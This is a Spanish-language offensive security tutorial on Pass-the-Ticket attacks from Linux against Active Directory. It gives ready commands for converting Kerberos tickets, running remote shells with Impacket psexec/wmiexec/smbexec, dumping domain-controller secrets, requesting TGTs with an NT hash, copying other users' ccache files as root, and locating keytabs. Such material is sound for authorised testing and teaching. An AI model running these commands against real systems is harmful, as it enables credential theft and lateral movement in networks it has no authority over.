# Pass-the-Ticket (PtT) desde Linux

Linux puede participar en entornos Kerberos de Active Directory mediante el stack MIT Kerberos. Los tickets se almacenan en archivos `.ccache` (credential cache) en lugar de en memoria de proceso como en Windows. Esto facilita su extracción, importación y uso con herramientas de Impacket.

### Almacenamiento de tickets en Linux

Los tickets Kerberos en Linux se guardan en archivos de caché, normalmente en `/tmp/krb5cc_<UID>` o en un keytab. La variable de entorno `KRB5CCNAME` apunta al archivo de caché activo.

```bash
# Ver tickets actuales
klist

# Ver ruta del ccache activo
echo $KRB5CCNAME

# Listar todos los ccaches del sistema
ls /tmp/krb5cc_*
```

### Convertir tickets Windows (.kirbi) a Linux (.ccache)

Los tickets exportados desde Windows con Mimikatz o Rubeus son archivos `.kirbi`. Para usarlos con Impacket en Linux hay que convertirlos:

```bash
# Impacket incluye el script de conversión
impacket-ticketConverter ticket.kirbi ticket.ccache

# Activar el ticket
export KRB5CCNAME=/ruta/ticket.ccache
klist    # verificar
```

### Convertir .ccache a .kirbi (dirección inversa)

```bash
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### Uso del ticket con herramientas Impacket

Una vez exportada la variable `KRB5CCNAME`, las herramientas Impacket usan el ticket automáticamente con el flag `-k -no-pass`:

```bash
export KRB5CCNAME=/tmp/jsmith.ccache

# Ejecutar comandos en el host remoto
impacket-psexec -k -no-pass dominio.local/jsmith@servidor.dominio.local
impacket-wmiexec -k -no-pass dominio.local/jsmith@servidor.dominio.local
impacket-smbexec -k -no-pass dominio.local/jsmith@servidor.dominio.local

# Acceso a shares
impacket-smbclient -k -no-pass dominio.local/jsmith@servidor.dominio.local

# Secretsdump con ticket de DA
impacket-secretsdump -k -no-pass dominio.local/jsmith@dc01.dominio.local
```

> Para que la autenticación Kerberos funcione correctamente desde Linux hay que resolver los nombres del dominio por DNS (no por IP) y sincronizar el reloj con el DC. Kerberos rechaza tickets si la diferencia horaria supera 5 minutos.

### Configuración de /etc/krb5.conf

```ini
[libdefaults]
    default_realm = DOMINIO.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    forwardable = true

[realms]
    DOMINIO.LOCAL = {
        kdc = dc01.dominio.local
        admin_server = dc01.dominio.local
    }

[domain_realm]
    .dominio.local = DOMINIO.LOCAL
    dominio.local = DOMINIO.LOCAL
```

### Solicitar TGT directamente desde Linux

```bash
# Con credenciales en texto claro
kinit jsmith@DOMINIO.LOCAL
# Introduce la contraseña cuando la pida

# Con hash NT (requiere paquete krb5-user y soporte RC4)
impacket-getTGT dominio.local/jsmith -hashes :64f12cddaa88057e06a81b54e73b949b
export KRB5CCNAME=jsmith.ccache
```

### Robo de ccache de otros usuarios

En sistemas Linux con varios usuarios, si se tiene acceso como root, se pueden copiar los ccaches de otros usuarios y usarlos:

```bash
# Listar ccaches disponibles
ls -la /tmp/krb5cc_*

# Copiar el ccache de otro usuario (requiere root)
cp /tmp/krb5cc_1001 /tmp/mi_ticket.ccache
chmod 600 /tmp/mi_ticket.ccache
export KRB5CCNAME=/tmp/mi_ticket.ccache
klist
```

### Linikatz — extracción de tickets de memoria

En sistemas Linux integrados en AD (con SSSD o winbind), puede haber credenciales Kerberos en la memoria de procesos o en keytabs:

```bash
# Buscar keytabs
find / -name "*.keytab" 2>/dev/null
find / -name "krb5.keytab" 2>/dev/null

# Usar un keytab directamente
kinit -k -t /etc/krb5.keytab host/servidor.dominio.local@DOMINIO.LOCAL
```

> En servidores Linux miembros de un dominio AD (servidores web, de correo, de bases de datos), los keytabs de cuenta de máquina permiten operar como `host/<servidor>$` en el dominio. Dependiendo de los permisos, esto puede dar acceso a recursos adicionales del dominio.
